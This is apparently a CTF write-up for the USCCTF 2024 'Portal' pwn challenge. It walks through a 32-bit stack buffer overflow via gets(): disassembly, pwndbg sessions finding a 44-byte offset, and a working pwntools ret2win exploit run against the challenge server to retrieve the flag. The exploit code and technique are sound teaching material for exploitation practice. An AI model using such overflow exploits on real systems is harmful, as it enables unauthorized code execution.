---
title: USCCTF2024 Pwn Portal
date: 2024-11-15 00:24:34 
categories: [Cybersecurity, Pwn, Binary Analysis, CTF, USCCTF]
tags:
  [pwn, gdb, cybersecurity, ctf, uscctf 2024]
---

## Description

	Can you use the portals to get to the right place?


You are provided with a 32-bit executable:

```shell
└─$ file portal 
portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped
```

Using checksec on this binary reveals that there are no security defenses enabled:

```shell
[*] '/home/kali/ctf/uscctf2024/pwn/portal/portal'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

This is a straightforward "return-to-win" challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:

```shell
...

080491f6 <get_return_address>:
 80491f6:       55                      push   %ebp
 80491f7:       89 e5                   mov    %esp,%ebp
 80491f9:       e8 38 01 00 00          call   8049336 <__x86.get_pc_thunk.ax>
 80491fe:       05 16 21 00 00          add    $0x2116,%eax
 8049203:       8b 45 04                mov    0x4(%ebp),%eax
 8049206:       5d                      pop    %ebp
 8049207:       c3                      ret

08049208 <win>:
 8049208:       55                      push   %ebp
 8049209:       89 e5                   mov    %esp,%ebp
 804920b:       53                      push   %ebx
 804920c:       83 ec 44                sub    $0x44,%esp
 804920f:       e8 1c ff ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 8049214:       81 c3 00 21 00 00       add    $0x2100,%ebx
 804921a:       83 ec 08                sub    $0x8,%esp
 804921d:       8d 83 f4 ec ff ff       lea    -0x130c(%ebx),%eax
 8049223:       50                      push   %eax
 8049224:       8d 83 f6 ec ff ff       lea    -0x130a(%ebx),%eax
 804922a:       50                      push   %eax
 804922b:       e8 90 fe ff ff          call   80490c0 <fopen@plt>
 8049230:       83 c4 10                add    $0x10,%esp
 8049233:       89 45 f4                mov    %eax,-0xc(%ebp)
 8049236:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
 804923a:       75 1c                   jne    8049258 <win+0x50>
 804923c:       83 ec 0c                sub    $0xc,%esp
 804923f:       8d 83 00 ed ff ff       lea    -0x1300(%ebx),%eax
 8049245:       50                      push   %eax
 8049246:       e8 45 fe ff ff          call   8049090 <puts@plt>
 804924b:       83 c4 10                add    $0x10,%esp
 804924e:       83 ec 0c                sub    $0xc,%esp
 8049251:       6a 00                   push   $0x0
 8049253:       e8 48 fe ff ff          call   80490a0 <exit@plt>
 8049258:       83 ec 04                sub    $0x4,%esp
 804925b:       ff 75 f4                push   -0xc(%ebp)
 804925e:       6a 2d                   push   $0x2d
 8049260:       8d 45 c7                lea    -0x39(%ebp),%eax
 8049263:       50                      push   %eax
 8049264:       e8 07 fe ff ff          call   8049070 <fgets@plt>
 8049269:       83 c4 10                add    $0x10,%esp
 804926c:       83 ec 0c                sub    $0xc,%esp
 804926f:       8d 45 c7                lea    -0x39(%ebp),%eax
 8049272:       50                      push   %eax
 8049273:       e8 d8 fd ff ff          call   8049050 <printf@plt>
 8049278:       83 c4 10                add    $0x10,%esp
 804927b:       90                      nop
 804927c:       8b 5d fc                mov    -0x4(%ebp),%ebx
 804927f:       c9                      leave
 8049280:       c3                      ret

08049281 <vuln>:
 8049281:       55                      push   %ebp
 8049282:       89 e5                   mov    %esp,%ebp
 8049284:       53                      push   %ebx
 8049285:       83 ec 24                sub    $0x24,%esp
 8049288:       e8 a3 fe ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 804928d:       81 c3 87 20 00 00       add    $0x2087,%ebx
 8049293:       83 ec 0c                sub    $0xc,%esp
 8049296:       8d 45 d8                lea    -0x28(%ebp),%eax
 8049299:       50                      push   %eax
 804929a:       e8 c1 fd ff ff          call   8049060 <gets@plt>
 804929f:       83 c4 10                add    $0x10,%esp
 80492a2:       e8 4f ff ff ff          call   80491f6 <get_return_address>
 80492a7:       83 ec 08                sub    $0x8,%esp
 80492aa:       50                      push   %eax
 80492ab:       8d 83 4c ed ff ff       lea    -0x12b4(%ebx),%eax
 80492b1:       50                      push   %eax
 80492b2:       e8 99 fd ff ff          call   8049050 <printf@plt>
 80492b7:       83 c4 10                add    $0x10,%esp
 80492ba:       90                      nop
 80492bb:       8b 5d fc                mov    -0x4(%ebp),%ebx
 80492be:       c9                      leave
 80492bf:       c3                      ret

080492c0 <main>:
 80492c0:       8d 4c 24 04             lea    0x4(%esp),%ecx
 80492c4:       83 e4 f0                and    $0xfffffff0,%esp
 80492c7:       ff 71 fc                push   -0x4(%ecx)
 80492ca:       55                      push   %ebp
 80492cb:       89 e5                   mov    %esp,%ebp
 80492cd:       53                      push   %ebx
 80492ce:       51                      push   %ecx
 80492cf:       83 ec 10                sub    $0x10,%esp
 80492d2:       e8 59 fe ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 80492d7:       81 c3 3d 20 00 00       add    $0x203d,%ebx
 80492dd:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
 80492e3:       8b 00                   mov    (%eax),%eax
 80492e5:       6a 00                   push   $0x0
 80492e7:       6a 02                   push   $0x2
 80492e9:       6a 00                   push   $0x0
 80492eb:       50                      push   %eax
 80492ec:       e8 bf fd ff ff          call   80490b0 <setvbuf@plt>
 80492f1:       83 c4 10                add    $0x10,%esp
 80492f4:       e8 87 fd ff ff          call   8049080 <getegid@plt>
 80492f9:       89 45 f4                mov    %eax,-0xc(%ebp)
 80492fc:       83 ec 04                sub    $0x4,%esp
 80492ff:       ff 75 f4                push   -0xc(%ebp)
 8049302:       ff 75 f4                push   -0xc(%ebp)
 8049305:       ff 75 f4                push   -0xc(%ebp)
 8049308:       e8 c3 fd ff ff          call   80490d0 <setresgid@plt>
 804930d:       83 c4 10                add    $0x10,%esp
 8049310:       83 ec 0c                sub    $0xc,%esp
 8049313:       8d 83 88 ed ff ff       lea    -0x1278(%ebx),%eax
 8049319:       50                      push   %eax
 804931a:       e8 71 fd ff ff          call   8049090 <puts@plt>
 804931f:       83 c4 10                add    $0x10,%esp
 8049322:       e8 5a ff ff ff          call   8049281 <vuln>
 8049327:       b8 00 00 00 00          mov    $0x0,%eax
 804932c:       8d 65 f8                lea    -0x8(%ebp),%esp
 804932f:       59                      pop    %ecx
 8049330:       5b                      pop    %ebx
 8049331:       5d                      pop    %ebp
 8049332:       8d 61 fc                lea    -0x4(%ecx),%esp
 8049335:       c3                      ret

...
```

The win function executes some operations, such as printing a flag. To exploit this, the program flow must be redirected to the win function.

## Analyzing the Program

Running the binary prompts for input:

```shell
Please enter your string: 
ABC
Okay, time to return... Fingers Crossed... Jumping to 0x80492a7
```

The program takes your input and overwrites the return address on the stack. By analyzing its behavior in gdb, you can determine how to craft the payload. Sending a long input, such as 100 As, crashes the program:

```shell
*EBP  0x41414141 ('AAAA')
*ESP  0xffffcedc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*EIP  0x80492bf (vuln+62) ◂— ret 
───────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────
   0x80492b2 <vuln+49>    call   printf@plt                  <printf@plt>
 
   0x80492b7 <vuln+54>    add    esp, 0x10                    ESP => 0xffffceb0 (0xffffcea0 + 0x10)
   0x80492ba <vuln+57>    nop    
   0x80492bb <vuln+58>    mov    ebx, dword ptr [ebp - 4]     EBX, [0xffffced4] => 0x41414141 ('AAAA')
   0x80492be <vuln+61>    leave  
 ► 0x80492bf <vuln+62>    ret                                <0x41414141>
    ↓



───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ esp 0xffffcedc ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        7 skipped
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► 0 0x80492bf vuln+62
   1 0x41414141 None
   2 0x41414141 None
   3 0x41414141 None
   4 0x41414141 None
   5 0x41414141 None
   6 0x41414141 None
   7 0x41414141 None
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
0x41414141 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
 EAX  0x40
 EBX  0x41414141 ('AAAA')
 ECX  0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0xffffcfcc —▸ 0xffffd1d8 ◂— 'COLORFGBG=15;0'
 EBP  0x41414141 ('AAAA')
*ESP  0xffffcee0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*EIP  0x41414141 ('AAAA')
───────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────
Invalid address 0x41414141
```

At this point, you control the EIP register. When a function returns, the ret instruction pops the top value of the stack into EIP, redirecting execution to that address.

## Finding the Offset

To determine the exact offset where the buffer overflow occurs, use a cyclic pattern:

```
───────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────
 ► 0x80491f9 <get_return_address+3>     call   __x86.get_pc_thunk.ax       <__x86.get_pc_thunk.ax>
        arg[0]: 0xffffced8 ◂— 'kaaalaaama'
        arg[1]: 0x80492a7 (vuln+38) ◂— sub esp, 8
        arg[2]: 0x61616161 ('aaaa')
        arg[3]: 0x61616162 ('baaa')
 
   0x80491fe <get_return_address+8>     add    eax, 0x2116
   0x8049203 <get_return_address+13>    mov    eax, dword ptr [ebp + 4]
   0x8049206 <get_return_address+16>    pop    ebp
   0x8049207 <get_return_address+17>    ret    
 
   0x8049208 <win>                      push   ebp
   0x8049209 <win+1>                    mov    ebp, esp
   0x804920b <win+3>                    push   ebx
   0x804920c <win+4>                    sub    esp, 0x44
   0x804920f <win+7>                    call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>
 
   0x8049214 <win+12>                   add    ebx, 0x2100
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ ebp esp 0xffffcea8 —▸ 0xffffced8 ◂— 'kaaalaaama'
01:0004│+004     0xffffceac —▸ 0x80492a7 (vuln+38) ◂— sub esp, 8
02:0008│ eax     0xffffceb0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
03:000c│+00c     0xffffceb4 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
04:0010│+010     0xffffceb8 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
05:0014│+014     0xffffcebc ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
06:0018│+018     0xffffcec0 ◂— 'eaaafaaagaaahaaaiaaajaaakaaalaaama'
07:001c│+01c     0xffffcec4 ◂— 'faaagaaahaaaiaaajaaakaaalaaama'
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► 0 0x80491f9 get_return_address+3
   1 0x80492a7 vuln+38
   2 0x6161616c None
   3 0xff00616d None
   4 0xf7d87964 None
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
Okay, time to return... Fingers Crossed... Jumping to 0x80492a7

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
*EAX  0x40
*EBX  0x6161616a ('jaaa')
*ECX  0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0xffffcfcc —▸ 0xffffd1d8 ◂— 'COLORFGBG=15;0'
*EBP  0x6161616b ('kaaa')
*ESP  0xffffcee0 ◂— 0xff00616d /* 'ma' */
*EIP  0x6161616c ('laaa')
───────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────
Invalid address 0x6161616c
```

As you can see, it tells you that `-x6161616c` was used to jump to that location which isn't available obviously. 

```
pwndbg> cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

This tells us that the buffer can hold 44 junk bytes before overwriting EIP. The final payload consists of:
- 44 bytes of junk
- The address of the win function (0x08049208).

## Crafting the Exploit

Using `pwntools`, you can automate the exploit:

```python
from pwn import *

context.update(arch='i386', os='linux')

#p = process("./portal")
p = remote('0.cloud.chals.io', 11723)

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
payload += p32(0x08049208)

p.sendline(payload)
p.interactive()

```

## Results

Running the script produces:

```shell
└─$ python solve.py 
[+] Opening connection to 0.cloud.chals.io on port 11723: Done
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80492a7
CYBORG{w0w_u_r_0n_y0ur_w4y_2_b_a_r34l_h4x0r![*] Got EOF while reading in interactive
```

## Conclusion

Although 32-bit executables are less common today due to the widespread adoption of 64-bit systems, they are still found in legacy applications, embedded systems, and challenges like this. Understanding how to exploit 32-bit binaries remains a valuable skill for learning system internals and practicing reverse engineering.
